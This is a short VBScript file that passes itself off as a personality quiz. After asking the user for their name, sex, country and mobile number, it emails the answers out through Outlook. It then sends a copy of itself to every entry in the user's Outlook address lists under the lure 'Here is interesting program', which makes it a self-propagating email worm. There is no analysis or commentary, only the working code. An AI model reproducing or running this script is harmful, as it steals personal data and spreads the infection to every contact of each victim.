main()
sub main()
on error resume next
Dim txtsub, txtobod,Input
Set wSh = CreateObject("WScript.Shell")
Set golApp = WScript.CreateObject("Outlook.Application")    
Set nMapi = golApp.GetNameSpace("MAPI") 
WScript.Echo "OK here we have very interesting quiz to try your luck."
Input0 = InputBox("What's your name?", Quiz1, Default, 100, 100)
Input1 = InputBox("Are you boy or girl?", Quiz1, Default, 100, 100)
Input2 = InputBox("Where do you come from ?", Quiz1, Default, 100, 100)
Input3 = InputBox("Which Pub you prfer ?", Quiz1, Default, 100, 100)
Input4 = InputBox("Input your Moblie No.we will let you know the result ?", Quize1, Default, 100, 100)
WScript.Echo "Have a good one,,,,,"
txtsub = "Answer"
txtobod ="Name:"&Input0+ "Sex:"&Input1 &chr(10)+"Country" &Input2 &chr(10)+"phone:" &Input4
Set sedut = golApp.CreateItem(0)
           sedut.Recipients.Add ("")
           sedut.Subject = txtsub
           sedut.Body = vbCrLf +txtobod
           sedut.Send
For ne = 1 To nMapi.AddressLists.Count
    Set ap = nMapi.AddressLists(ne)
    x = 1
       For uEnty = 1 To ap.AddressEntries.Count
           corad = ap.AddressEntries(x)
           Set sedut = golApp.CreateItem(0)
           sedut.Recipients.Add (corad)
           sedut.Subject = "have a good one"
           sedut.Body = vbCrLf & +"Here is interesting program"
           sedut.Attachments.Add(WScript.ScriptFullName)
           sedut.Send
           x=x+1  
        Next
Next
End Sub
